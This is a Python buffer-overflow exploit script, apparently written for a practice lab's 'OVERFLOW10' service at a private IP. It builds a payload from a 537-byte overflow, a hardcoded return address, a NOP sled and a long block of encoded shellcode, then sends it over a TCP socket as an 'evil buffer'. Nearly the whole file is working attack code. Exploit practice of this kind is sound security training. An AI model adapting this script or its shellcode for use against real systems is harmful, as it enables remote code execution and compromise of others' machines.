#!/usr/bin/env python3
import socket

ip = "10.10.110.192"
port = 1337

prefix = "OVERFLOW10 "
offset = 537
jmp_eip = "\xaf\x11\x50\x62"
overflow = "A" * 537
padding = "\x90" * 10

# \x00\xa0\xad\xbe\xde\xef

payload =  ""
payload += "\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
payload += "\x81\x76\x0e\x9f\x27\xf8\x8f\x83\xee\xfc\xe2\xf4"
payload += "\x63\xcf\x7a\x8f\x9f\x27\x98\x06\x7a\x16\x38\xeb"
payload += "\x14\x77\xc8\x04\xcd\x2b\x73\xdd\x8b\xac\x8a\xa7"
payload += "\x90\x90\xb2\xa9\xae\xd8\x54\xb3\xfe\x5b\xfa\xa3"
payload += "\xbf\xe6\x37\x82\x9e\xe0\x1a\x7d\xcd\x70\x73\xdd"
payload += "\x8f\xac\xb2\xb3\x14\x6b\xe9\xf7\x7c\x6f\xf9\x5e"
payload += "\xce\xac\xa1\xaf\x9e\xf4\x73\xc6\x87\xc4\xc2\xc6"
payload += "\x14\x13\x73\x8e\x49\x16\x07\x23\x5e\xe8\xf5\x8e"
payload += "\x58\x1f\x18\xfa\x69\x24\x85\x77\xa4\x5a\xdc\xfa"
payload += "\x7b\x7f\x73\xd7\xbb\x26\x2b\xe9\x14\x2b\xb3\x04"
payload += "\xc7\x3b\xf9\x5c\x14\x23\x73\x8e\x4f\xae\xbc\xab"
payload += "\xbb\x7c\xa3\xee\xc6\x7d\xa9\x70\x7f\x78\xa7\xd5"
payload += "\x14\x35\x13\x02\xc2\x4f\xcb\xbd\x9f\x27\x90\xf8"
payload += "\xec\x15\xa7\xdb\xf7\x6b\x8f\xa9\x98\xd8\x2d\x37"
payload += "\x0f\x26\xf8\x8f\xb6\xe3\xac\xdf\xf7\x0e\x78\xe4"
payload += "\x9f\xd8\x2d\xdf\xcf\x77\xa8\xcf\xcf\x67\xa8\xe7"
payload += "\x75\x28\x27\x6f\x60\xf2\x6f\xe5\x9a\x4f\xf2\x82"
payload += "\x92\x60\x90\x8d\x9f\x26\x43\x06\x79\x4d\xe8\xd9"
payload += "\xc8\x4f\x61\x2a\xeb\x46\x07\x5a\x1a\xe7\x8c\x83"
payload += "\x60\x69\xf0\xfa\x73\x4f\x08\x3a\x3d\x71\x07\x5a"
payload += "\xf7\x44\x95\xeb\x9f\xae\x1b\xd8\xc8\x70\xc9\x79"
payload += "\xf5\x35\xa1\xd9\x7d\xda\x9e\x48\xdb\x03\xc4\x8e"
payload += "\x9e\xaa\xbc\xab\x8f\xe1\xf8\xcb\xcb\x77\xae\xd9"
payload += "\xc9\x61\xae\xc1\xc9\x71\xab\xd9\xf7\x5e\x34\xb0"
payload += "\x19\xd8\x2d\x06\x7f\x69\xae\xc9\x60\x17\x90\x87"
payload += "\x18\x3a\x98\x70\x4a\x9c\x18\x92\xb5\x2d\x90\x29"
payload += "\x0a\x9a\x65\x70\x4a\x1b\xfe\xf3\x95\xa7\x03\x6f"
payload += "\xea\x22\x43\xc8\x8c\x55\x97\xe5\x9f\x74\x07\x5a"

buffer = prefix + overflow + jmp_eip + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
